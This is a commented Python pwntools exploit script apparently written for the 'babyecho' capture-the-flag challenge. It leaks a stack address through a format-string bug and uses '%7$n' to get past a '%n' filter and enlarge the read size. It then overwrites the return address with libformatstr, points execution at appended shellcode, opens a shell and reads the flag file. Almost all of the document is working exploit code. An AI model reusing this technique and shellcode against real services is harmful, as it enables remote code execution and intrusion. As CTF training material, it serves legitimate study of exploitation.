#!/usr/bin/env python
from pwn import *
import libformatstr

# Pretty simple binary, looks like this:
#
# size = 13;
# while ( 1 )
# {
#   max = 1023;
#   if ( size <= 1023 )
#     max = size;
#   size = max;
#   printf("Reading %d bytes\n", N);
#   readuntil(buffer, size, '\n');
#   remove_percentn(buffer);
#   printf(buffer);
#   putchar('\n');
# }
#
# Of note, the variable size is on the stack, and the
# function remove_percentn converts '%n' to '_n'.
#
# It does not, however, do anything about '%1$n'.
p = remote(get_target_ip("104.236.197.208"), 10010)

# Leak the address of our buffer on the stack.
#
# If we dump the stack immediately before the call to printf, it looks
# like this.
#
# 00:0000| esp  0xff8aad20 --> 0xff8aad3c <-- '%5$p'
# 01:0004|      0xff8aad24 <-- 0xd /* '\r' */
# 02:0008|      0xff8aad28 <-- 0xa /* '\n' */
# 03:000c|      0xff8aad2c <-- 0
# 04:0010|      0xff8aad30 <-- 0xd /* '\r' */
# 05:0014|      0xff8aad34 --> 0xff8aad3c <-- '%5$p'
# 06:0018|      0xff8aad38 <-- 0
# 07:001c| eax  0xff8aad3c <-- '%5$p'
#
# The format string is in arg0, and the leftmost column is an argument
# index which can be accessed via '%<number>$<format>'.  In order to dump
# the buffer address, we use '%5$p'.  One could also use '%5$x' or '$5$d'
# or any other numeric format, I just use p because it's convenient.
p.recvline()
p.sendline('%5$p')
buf_addr = int(p.recvline(), 0)

# Based on this, we can calculate the addresses of some other fields.
#
# The size field is in slot 4 (note it is 13, 0xd, in the stack dump above).
# The return address is not actually on the stack yet as we haven't called
# printf yet, but we can calculate its address since we know where it will be.
size_addr = buf_addr - 0xc
ret_addr  = buf_addr - 0x20

log.info("buffer: %#x" % buf_addr)
log.info("size:   %#x" % size_addr)
log.info("$ra:    %#x" % ret_addr)

# Now we want to overwrite the buffer size on the stack so we can use a
# longer format string.
#
# To do this, we place the address of the size at the beginning of our buffer,
# and use %n to write to that address.
p.sendline(pack(size_addr) + '%99c%7$n')

# Now that we're just doing "regular" format string exploitation, we can
# use hellman's wonderful libformatstr to overwrite the return address
# with a pointer into our buffer -- where we will put some shellcode.
#
# The offset 0x30 was chosen by checking how long the format string is
# when generated by libformatstr.
f = libformatstr.FormatStr()
f[ret_addr] = buf_addr + 0x30
payload = f.payload(arg_index=7) # Our buffer starts at slot 7

# Pad it out to the offset we picked at random, append the shellcode.
payload = payload.ljust(0x30)
payload += asm(shellcraft.sh())
p.sendline(payload)

# Have a shell
p.clean()
p.sendline('cat /home/babyecho/flag')
flag = p.recvline()
submit_flag(flag)
